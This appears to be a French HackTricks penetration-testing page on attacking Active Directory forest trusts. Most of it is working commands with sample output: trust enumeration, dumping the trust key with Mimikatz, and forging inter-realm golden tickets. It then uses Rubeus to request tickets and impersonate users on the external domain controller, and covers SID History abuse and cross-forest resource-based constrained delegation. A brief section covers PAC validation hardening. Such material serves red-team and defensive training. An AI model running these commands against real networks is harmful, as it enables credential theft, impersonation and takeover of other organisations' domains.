# Domaine de forêt externe - OneWay (Inbound) ou bidirectionnel

{{#include ../../banners/hacktricks-training.md}}

Dans ce scénario, un domaine externe vous fait confiance (ou les deux se font mutuellement confiance), vous pouvez donc obtenir une forme d'accès sur ce domaine.

## Énumération

Tout d'abord, vous devez **énumérer** la **relation de confiance** :
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM

# Get name of DC of the other domain
Get-DomainComputer -Domain domain.external -Properties DNSHostName
dnshostname
-----------
dc.domain.external

# Groups that contain users outside of its domain and return its members
Get-DomainForeignGroupMember -Domain domain.external
GroupDomain             : domain.external
GroupName               : Administrators
GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=domain,DC=external
MemberDomain            : domain.external
MemberName              : S-1-5-21-3263068140-2042698922-2891547269-1133
MemberDistinguishedName : CN=S-1-5-21-3263068140-2042698922-2891547269-1133,CN=ForeignSecurityPrincipals,DC=domain,
DC=external

# Get name of the principal in the current domain member of the cross-domain group
ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1133
DEV\External Admins

# Get members of the cros-domain group
Get-DomainGroupMember -Identity "External Admins" | select MemberName
MemberName
----------
crossuser

# Lets list groups members
## Check how the "External Admins" is part of the Administrators group in that DC
Get-NetLocalGroupMember -ComputerName dc.domain.external
ComputerName : dc.domain.external
GroupName    : Administrators
MemberName   : SUB\External Admins
SID          : S-1-5-21-3263068140-2042698922-2891547269-1133
IsGroup      : True
IsDomain     : True

# You may also enumerate where foreign groups and/or users have been assigned
# local admin access via Restricted Group by enumerating the GPOs in the foreign domain.

# Additional trust hygiene checks (AD RSAT / AD module)
Get-ADTrust -Identity domain.external -Properties SelectiveAuthentication,SIDFilteringQuarantined,SIDFilteringForestAware,TGTDelegation,ForestTransitive
```
> `SelectiveAuthentication`/`SIDFiltering*` vous permettent de voir rapidement si des chemins d'abus inter-forêts (RBCD, SIDHistory) sont susceptibles de fonctionner sans prérequis supplémentaires.

Dans l'énumération précédente, il a été trouvé que l'utilisateur **`crossuser`** appartient au groupe **`External Admins`**, qui dispose d'un **accès administrateur** au **DC du domaine externe**.

## Initial Access

Si vous **n'avez pas** trouvé d'accès **particulier** pour votre utilisateur dans l'autre domaine, vous pouvez revenir à la AD Methodology et essayer de **privesc from an unprivileged user** (des choses comme kerberoasting par exemple) :

Vous pouvez utiliser les **fonctions Powerview** pour **énumérer** l'**autre domaine** en utilisant le paramètre `-Domain` comme dans :
```bash
Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
```
{{#ref}}
./
{{#endref}}

## Impersonation

### Connexion

En utilisant une méthode standard avec les identifiants d'un utilisateur ayant accès au domaine externe, vous devriez pouvoir accéder à :
```bash
Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
```
### Abus de SID History

Vous pouvez également abuser de [**SID History**](sid-history-injection.md) à travers un trust de forêt.

Si un utilisateur est migré **d'une forêt à une autre** et que **SID Filtering n'est pas activé**, il devient possible **d'ajouter un SID provenant de l'autre forêt**, et ce **SID** sera **ajouté** au **jeton de l'utilisateur** lors de l'authentification **à travers le trust**.

> [!WARNING]
> Pour rappel, vous pouvez obtenir la clé de signature avec
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
> ```

Vous pouvez **signer avec** la clé **trusted** un **TGT impersonating** l'utilisateur du domaine actuel.
```bash
# Get a TGT for the cross-domain privileged user to the other domain
Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:C:\path\save\ticket.kirbi /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
### Procédé complet d'usurpation de l'utilisateur
```bash
# Get a TGT of the user with cross-domain permissions
Rubeus.exe asktgt /user:crossuser /domain:sub.domain.local /aes256:70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80 /opsec /nowrap

# Get a TGT from the current domain for the target domain for the user
Rubeus.exe asktgs /service:krbtgt/domain.external /domain:sub.domain.local /dc:dc.sub.domain.local /ticket:doIFdD[...snip...]MuSU8= /nowrap

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:doIFMT[...snip...]5BTA== /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
### Cross-forest RBCD lorsque vous contrôlez un compte machine dans la forêt de confiance (no SID filtering / selective auth)

Si votre foreign principal (FSP) vous place dans un groupe pouvant écrire des objets ordinateur dans la forêt de confiance (par ex., `Account Operators`, groupe de provisionnement personnalisé), vous pouvez configurer **Resource-Based Constrained Delegation** sur un hôte cible de cette forêt et vous faire passer pour n'importe quel utilisateur de celle-ci :
```bash
# 1) From the trusted domain, create or compromise a machine account (MYLAB$) you control
# 2) In the trusting forest (domain.external), set msDS-AllowedToAct on the target host for that account
Set-ADComputer -Identity victim-host$ -PrincipalsAllowedToDelegateToAccount MYLAB$
# or with PowerView
Set-DomainObject victim-host$ -Set @{'msds-allowedtoactonbehalfofotheridentity'=$sidbytes_of_MYLAB}

# 3) Use the inter-forest TGT to perform S4U to victim-host$ and get a CIFS ticket as DA of the trusting forest
Rubeus.exe s4u /ticket:interrealm_tgt.kirbi /impersonate:EXTERNAL\Administrator /target:victim-host.domain.external /protocol:rpc
```
Cela ne fonctionne que lorsque **SelectiveAuthentication is disabled** et que **SID filtering** ne supprime pas votre SID de contrôle. C'est un chemin latéral rapide qui évite SIDHistory forging et qui est souvent manqué lors des revues de trust.

### Renforcement de la validation PAC

Les mises à jour de la validation de signature PAC pour **CVE-2024-26248**/**CVE-2024-29056** ajoutent une exigence de signature sur les tickets inter-forest. En **Compatibility mode**, les chemins forgés inter-realm PAC/SIDHistory/S4U peuvent encore fonctionner sur des DCs non corrigés. En **Enforcement mode**, les données PAC non signées ou altérées traversant un forest trust sont rejetées, sauf si vous possédez également la clé de trust de la forêt cible. Les overrides du registre (`PacSignatureValidationLevel`, `CrossDomainFilteringLevel`) peuvent affaiblir cela tant qu'ils restent disponibles.



## Références

- [Microsoft KB5037754 – PAC validation changes for CVE-2024-26248 & CVE-2024-29056](https://support.microsoft.com/en-au/topic/how-to-manage-pac-validation-changes-related-to-cve-2024-26248-and-cve-2024-29056-6e661d4f-799a-4217-b948-be0a1943fef1)
- [MS-PAC spec – SID filtering & claims transformation details](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/55fc19f2-55ba-4251-8a6a-103dd7c66280)
{{#include ../../banners/hacktricks-training.md}}
